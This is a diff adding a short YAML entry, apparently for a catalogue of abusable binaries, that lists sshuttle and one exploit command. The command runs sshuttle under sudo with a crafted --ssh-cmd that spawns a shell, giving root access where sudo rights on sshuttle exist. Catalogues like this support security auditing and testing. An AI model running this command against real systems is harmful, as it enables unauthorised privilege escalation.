@@ -1,0 +1,4 @@
+name: sshuttle
+binary_path: /usr/bin/sshuttle
+exploit_cmds:
+- sudo /usr/bin/sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
